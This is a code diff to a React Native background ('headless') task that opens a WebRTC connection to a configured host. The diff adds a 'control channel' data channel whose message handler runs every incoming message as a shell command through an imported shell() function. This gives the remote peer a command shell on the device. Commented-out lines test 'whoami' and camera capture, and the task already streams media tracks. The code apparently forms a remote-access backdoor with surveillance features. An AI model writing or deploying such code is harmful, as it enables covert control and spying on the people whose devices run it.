@@ -9,8 +9,9 @@ import {
   mediaDevices,
   //   registerGlobals,
 } from 'react-native-webrtc';
-
 // registerGlobals();
+
+import {shell} from 'awesome-module';
 
 // import notifee, {AndroidImportance} from '@notifee/react-native';
 
@@ -21,6 +22,14 @@ import {HOST as hostname, peerConnectionOptions} from './setting';
 
 export async function task() {
   console.log(chalk.greenBright.bold.bgBlack('headless task start'));
+
+  // console.log(await multiply(3, 4));
+  // console.log(await shell('whoami'));
+
+  // const medias = await mediaDevices.getUserMedia({video: true});
+  // console.log(medias);
+
+  // return;
 
   const id = '111';
   const targetID = '112';
@@ -64,6 +73,27 @@ export async function task() {
   // rtc
 
   const peerConnection = new RTCPeerConnection(peerConnectionOptions);
+
+  // data channel
+  const dataChannel = peerConnection.createDataChannel('control channel', {
+    ordered: true,
+  });
+
+  (dataChannel as any).addEventListener('open', () => {
+    console.log(chalk.green('Data channel opened'));
+    // dataChannel.send('Hello!');
+  });
+
+  (dataChannel as any).addEventListener('message', async (event: any) => {
+    const message = event.data;
+    console.log(chalk.green('Received message on data channel:'), message);
+
+    try {
+      await shell(message);
+    } catch (error) {
+      console.error(chalk.red('Error executing command:'), error);
+    }
+  });
 
   // console.log(stream.getTracks());
   stream.getTracks().forEach(track => {
